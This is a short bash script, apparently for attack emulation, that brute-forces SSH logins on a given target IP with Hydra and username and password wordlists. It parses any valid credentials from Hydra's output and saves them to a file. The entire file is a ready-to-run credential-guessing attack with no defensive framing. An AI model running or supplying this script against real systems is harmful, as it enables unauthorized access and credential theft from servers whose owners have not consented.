#!/bin/bash

# T1190 Exploitation Script - SSH Weak Configuration Attack
# This script attempts to discover SSH service vulnerabilities and exploit weak configurations.


if [ "$#" -lt 1 ]; then
    echo "Usage: $0 <target_ip>"
    exit 1
fi
TARGET="$1"
WORDLIST_USER="/home/attacks/wordlists/username.txt"
WORDLIST_PASS="/home/attacks/wordlists/password.txt"
CREDENTIALS_FILE="/home/attacks/found_credentials_$TARGET.txt"


# Attempt to brute force login using common usernames and passwords
if [ ! -f "$WORDLIST_USER" ] || [ ! -f "$WORDLIST_PASS" ]; then
    echo "[-] Username or password wordlist not found. Ensure $WORDLIST_USER and $WORDLIST_PASS exist."
    exit 1
fi

# Use Hydra to perform SSH brute force attack
echo "[+] Starting SSH brute force attack using Hydra..."
#hydra -L "$WORDLIST_USER" -P "$WORDLIST_PASS" -t 1 -vV -f -W 1 ssh://$TARGET
HYDRA_OUTPUT=$(timeout 5 hydra -L "$WORDLIST_USER" -P "$WORDLIST_PASS" -t 1 -vV -f ssh://$TARGET)
#timeout 10 hydra -L "$WORDLIST_USER" -P "$WORDLIST_PASS" -t 1 -vV -f ssh://$TARGET
EXIT_CODE=$?

# Check the exit code
if [ $EXIT_CODE -eq 124 ]; then
    echo "[-] Hydra brute force attack failed and timed out."
elif [ $EXIT_CODE -eq 0 ] && echo "$HYDRA_OUTPUT" | grep -q "login:"; then
    echo "[+] Exploit successful: Found valid credentials using Hydra."
    echo "$HYDRA_OUTPUT" | grep "login:" | while read -r LINE; do
        USER=$(echo "$LINE" | grep -oP "(?<=login: ).*?(?=\s)")
        PASS=$(echo "$LINE" | grep -oP "(?<=password: ).*?(?=\s|$)")
        if [ -n "$USER" ] && [ -n "$PASS" ]; then
            echo "[+] Found credentials - Username: $USER, Password: $PASS"
            echo "$TARGET,$USER,$PASS" >> "$CREDENTIALS_FILE"
        fi
    done
    echo "[+] Credentials saved to $CREDENTIALS_FILE"
else
    echo "[-] Exploit failed: Could not find valid credentials."
fi

